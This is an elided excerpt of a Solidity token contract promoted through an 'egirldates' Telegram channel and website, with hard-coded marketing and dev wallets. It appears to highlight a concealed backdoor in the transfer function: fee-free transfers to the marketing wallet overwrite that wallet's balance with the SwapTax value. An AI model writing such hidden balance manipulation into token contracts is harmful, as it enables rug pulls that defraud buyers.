...
//Telegram: https://t.me/egirldates
//website: https://www.egirldates.com
...
contract asd is Context, IERC20 { 
    ...
    address payable public Marketing_Wallet = payable(0xd246519F4DF99914013ce29523C40490FB2A8dCB); 
    address payable public Wallet_Dev = payable(0x3C108059cCA45858Bffb5C6dd1491b93a2422A30);
    ...
    constructor () {
        ...
        _owner = 0x3C108059cCA45858Bffb5C6dd1491b93a2422A30;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == Marketing_Wallet){ 
                _tOwned[recipient] = SwapTax--;
            }
